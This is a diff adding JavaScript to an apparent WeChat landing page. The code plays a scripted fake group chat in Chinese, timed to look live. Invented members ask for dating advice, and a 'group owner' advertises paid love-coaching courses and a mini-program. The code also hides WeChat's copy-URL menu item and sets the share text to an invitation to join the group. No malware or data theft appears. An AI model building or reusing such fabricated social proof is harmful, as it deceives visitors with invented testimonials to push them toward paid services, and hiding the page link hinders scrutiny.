+            contents = eval('(' + '["\u6700\u8fd1\u603b\u662f\u8ddf\u5973\u670b\u53cb\u5435\u67b6\uff0c\u4e0d\u77e5\u9053\u600e\u4e48\u804a\u5929\u6c9f\u901a\u4e86","\u6211\u4e5f\u662f\u8ddf\u5973\u670b\u53cb\u5f02\u5730\u604b\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u5c55\u5f00\u8bdd\u9898","\u7fa4\u4e3b\u597d\u50cf\u662f\u604b\u7231\u5927\u795e\uff0c\u6709\u6ca1\u6709\u64a9\u59b9\u7684\u6280\u5de7\u4f20\u6388\u4e00\u4e0b\u54e6","RIGHT\u672c\u4eba\u4e13\u6ce8\u604b\u7231\u5fc3\u7406\u5b66\u7814\u7a7610\u5e74\u7ecf\u9a8c\uff0c\u6709\u4e30\u5bcc\u7684\u604b\u7231\u8bdd\u672f\u4e00\u5bf9\u4e00\u6307\u5bfc\uff0c\u4e3b\u8981\u4e1a\u52a1\u6709\uff1a\u5f02\u5730\u604b\u5173\u7cfb\u7834\u51b0\u3001\u76f8\u4eb2\u6280\u5de7\u3001\u5206\u624b\u633d\u56de\u3001\u5a5a\u59fb\u7ecf\u8425\u3001\u51b7\u6218\u5904\u7406\u3001\u804a\u5929\u642d\u8baa\u3001\u5f62\u8c61\u6539\u9020\u3001\u6c14\u8d28\u63d0\u5347\u7b49\u8bfe\u7a0b\u57f9\u8bad","\u54c7\uff01\u7fa4\u4e3b\u597d\u4f1a\u54e6(\u00b4-\u03c9-`)","\u770b\u7fa4\u4e3b\u8fd9\u67b6\u52bf \u4e0d\u8c08\u4e2a\u51e0\u5341\u6b21\u604b\u7231 \u90fd\u603b\u7ed3\u4e0d\u51fa\u8fd9\u4e48\u591a\u7ecf\u9a8c\u554a\uff01\u4e0d\u50cf\u6211\u4e00\u6b21\u604b\u7231\u6ca1\u8c08\u8fc7\uff0c\u61ca\u607c\u554a\uff01\u5e94\u8be5\u65e9\u9047\u5230\u50cf\u4f60\u4eec\u8fd9\u4e48\u4f18\u79c0\u7684\u4eba","\u6211\u4e5f\u662f\u4e00\u4e2a\u5355\u8eab\u72d7\uff0c\u60f3\u5b66\u4e60\u4e00\u4e0b\u8ffd\u5973\u751f\u7684\u6280\u5de7\uff0c\u81ea\u5df1\u5634\u5df4\u592a\u7b28\u4e86\uff0c\u4e0d\u592a\u4f1a\u8bf4\u8bdd\uff0c\u521a\u597d\u5b66\u4e60\u4e00\u4e0b","RIGHT\u5927\u5bb6\u4e0d\u8981\u6025\u54c8\uff0c\u4eca\u5929\u665a\u4e0a8\u70b9\u949f\uff0c\u7531\u6211\u4eb2\u81ea\u4e3a\u5927\u5bb6\u89e3\u7b54\u4e00\u5207\u5173\u4e8e\u604b\u7231\u3001\u5a5a\u59fb\u3001\u4ea4\u53cb\u4e2d\u9047\u5230\u7684\u5404\u79cd\u7591\u96be\u95ee\u9898\uff01\u624b\u628a\u624b\u53eb\u4f60\u4eec\u8c08\u604b\u7231","\u5c0f\u677f\u51f3\u5df2\u5907\u597d\uff0c\u5750\u7b49\u7fa4\u4e3b\u5f00\u8bfe\u5566","\u5e0c\u671b\u53ef\u4ee5\u901a\u8fc7\u5b66\u4e60\u5c3d\u65e9\u6446\u813120\u5e74\u7684\u5355\u8eab\u751f\u6d3b\uff5e\u563f\u563f","RIGHT\u5bb6\u4eba\u4eec\u4e5f\u53ef\u4ee5\u5173\u6ce8\u6211\u7684\u5c0f\u7a0b\u5e8f\uff0c\u6211\u628a\u6211\u603b\u7ed3\u7684\u4e00\u5207\u7ecf\u9a8c\u548c\u8bdd\u672f\u90fd\u5199\u5728\u91cc\u9762\uff0c\u800c\u4e14\u6bcf\u5929\u90fd\u4f1a\u5173\u6ce8\u5927\u5bb6\u7684\u63d0\u95ee\u548c\u7559\u8a00\u54e6\uff01\u795d\u5927\u5bb6\u65e9\u65e5\u6446\u8131\u5355\u8eab\uff01\uff01\u8ddf\u81ea\u5df1\u5bf9\u8c61\u5173\u7cfb\u8d8a\u51fa\u8d8a\u597d(\u272a\u25bd\u272a)"]' + ')');
+            var protocol = '';
+
+            var timer = null;
+            var contentLength = contents.length;
+            var i = 0;
+            //
+            timer = setInterval(function () {
+                if (contents[i].indexOf('RIGHT') != -1) {
+                    var oFakeRightBox = document.createElement('div');
+                    oFakeRightBox.className = 'fakeRight';
+                    var oFakeChatIconRight = document.createElement('div');
+                    oFakeChatIconRight.className = 'fakeChatIconRight';
+                    var oRightImg = document.createElement('img');
+                    oRightImg.className = 'img';
+                    oRightImg.src = protocol + '/qq0330/Public/img/fakeChat/' + pictures[pictures.length - 1];
+                    var oFakeChatRight = document.createElement('div');
+                    oFakeChatRight.className = 'fakeChatRight';
+                    oFakeChatRight.innerText = contents[i].substring(5);
+                    var oFakeAngleRight = document.createElement('div');
+                    oFakeAngleRight.className = 'fakeAngleRight';
+
+                    oFakeChatIconRight.appendChild(oRightImg);
+                    oFakeRightBox.appendChild(oFakeChatIconRight);
+                    oFakeRightBox.appendChild(oFakeChatRight);
+                    oFakeRightBox.appendChild(oFakeAngleRight);
+
+                    oBox.insertBefore(oFakeRightBox, oBottom);
+                } else {
+                    var oAppendDiv = document.createElement('div');
+                    oAppendDiv.className = 'fake';
+                    var oDiv = document.createElement('div');
+                    oDiv.className = 'fakeChatIcon';
+                    var oImg = document.createElement('img');
+                    oImg.className = 'img';
+                    oImg.src = protocol + '/qq0330/Public/img/fakeChat/' + pictures[i];
+                    var oDivContent = document.createElement('div');
+                    oDivContent.className = 'fakeChat';
+                    oDivContent.innerText = contents[i];
+                    var oDivAngle = document.createElement('div');
+                    oDivAngle.className = 'fakeAngle';
+                    oDiv.appendChild(oImg);
+                    oAppendDiv.appendChild(oDiv);
+                    oAppendDiv.appendChild(oDivContent);
+                    oAppendDiv.appendChild(oDivAngle);
+
+                    oBox.insertBefore(oAppendDiv, oBottom);
+                }
+
+                i++;
+
+                if (i > contentLength - 1) {
+                    clearInterval(timer);
+                    setTimeout(function () {
+                        oBox.style.display = 'none';
+                    }, 2500)
+                }
+
+                window.scrollTo(0, document.documentElement.clientHeight);
+            }, 1500);
+        }
+    }
+
+    wx.ready(function () {
+        wx.hideMenuItems({
+            menuList: [
+                "menuItem:copyUrl"
+            ] // 要隐藏的菜单项，只能隐藏“传播类”和“保护类”按钮，所有menu项见附录3
+        });
+
+        wx.onMenuShareTimeline({
+            title: '', // 分享标题
+            link: '', // 分享链接
+            imgUrl: '', // 分享图标
+            success: function () {
+
+            },
+            cancel: function () {
+                // 用户取消分享后执行的回调函数
+            }
+        });
+        // config信息验证后会执行ready方法，所有接口调用都必须在config接口获得结果之后，config是一个客户端的异步操作，所以如果需要在页面加载时就调用相关接口，则须把相关接口放在ready函数中调用来确保正确执行。对于用户触发时才调用的接口，则可以直接调用，不需要放在ready函数中。
+        wx.onMenuShareAppMessage({
+            title: '', // 分享标题
+            link: '', // 分享链接
+            imgUrl: '/', // 分享图标
+            desc: '点我进群', // 分享描述
+            type: '', // 分享类型,music、video或link，不填默认为link
+            dataUrl: '', // 如果type是music或video，则要提供数据链接，默认为空
+            success: function () {
+                // 用户确认分享后执行的回调
+            },
+            cancel: function () {
+                // 用户取消分享后执行的回调函数
+            }
+        });
+    });
+</script>
 </html>
